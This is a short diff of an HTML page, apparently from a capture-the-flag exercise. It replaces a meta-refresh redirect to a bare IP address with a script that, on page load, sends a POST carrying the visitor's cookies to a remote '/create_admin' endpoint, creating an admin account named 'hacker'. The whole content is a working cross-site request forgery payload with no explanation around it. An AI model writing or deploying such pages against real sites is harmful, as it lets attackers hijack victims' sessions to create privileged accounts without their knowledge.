@@ -1,1 +1,15 @@
-<meta http-equiv="refresh" content="0; url=http://5.129.236.206:8000/">
+<!doctype html>
+<html>
+<body>
+<script>
+fetch("http://tasks.goidactf.ru:20159/create_admin", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "new_admin_login=hacker"
+});
+</script>
+</body>
+</html>
